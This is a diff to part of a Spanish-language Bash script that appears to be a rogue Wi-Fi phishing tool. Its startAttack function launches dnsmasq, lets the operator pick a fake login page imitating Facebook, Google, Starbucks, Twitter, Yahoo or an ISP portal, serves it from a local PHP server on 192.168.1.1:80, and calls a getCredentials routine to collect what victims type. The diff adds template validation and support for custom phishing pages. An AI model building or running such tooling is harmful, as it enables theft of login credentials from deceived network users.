@@ -150,12 +150,32 @@ function startAttack(){
 	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
 	sleep 5
 
-	tput cnorm; echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, optimumwifi):${endColour} " && read template
-	tput civis; cp -r $template/* .
-	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
-	php -S 192.168.1.1:80 > /dev/null 2>&1 &
-	sleep 2
-	getCredentials
+	# Array de plantillas
+	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login optimumwifi)
+
+	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
+	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, optimumwifi):${endColour} " && read template
+
+	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
+		if [ "$plantilla" == "$template" ]; then
+			check_plantillas=1
+		fi
+	done
+
+	if [ $check_plantillas -eq 1 ]; then
+		tput civis; cp -r $template/* .
+		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
+		php -S 192.168.1.1:80 > /dev/null 2>&1 &
+		sleep 2
+		getCredentials
+	else
+		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
+		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
+		pushd $template > /dev/null 2>&1
+		php -S 192.168.1.1:80 > /dev/null 2>&1 &
+		sleep 2
+		popd > /dev/null 2>&1; getCredentials
+	fi
 }
 
 # Main Program
